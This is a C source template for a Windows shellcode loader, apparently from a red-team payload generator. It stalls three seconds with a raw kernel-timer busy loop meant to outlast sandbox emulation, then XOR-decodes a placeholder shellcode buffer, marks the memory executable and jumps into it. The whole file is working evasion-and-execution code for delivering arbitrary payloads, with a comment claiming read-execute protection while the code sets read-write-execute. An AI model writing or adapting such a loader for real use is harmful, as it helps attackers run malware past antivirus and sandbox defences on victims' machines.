#include <windows.h>
#include <stdio.h>

// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}

int sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

void antiemulation() {
    sleep_ms(3000);
}



void XOR(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
    int myByte = 0;
    for (int idx = 0;  idx < ciphertext_len; idx++) {
        if (myByte == key_len)
        { 
            myByte = 0;
        }
        
        ciphertext[idx] = ciphertext[idx] ^ key[myByte];
        myByte++;
    }
}


int main(void)
{
	DWORD result;
	{{SHELLCODE}}

    antiemulation();
	
	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Decode the shellcode
	XOR((char *) dest, sizeof(shellcode), xorkey, strlen(xorkey));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
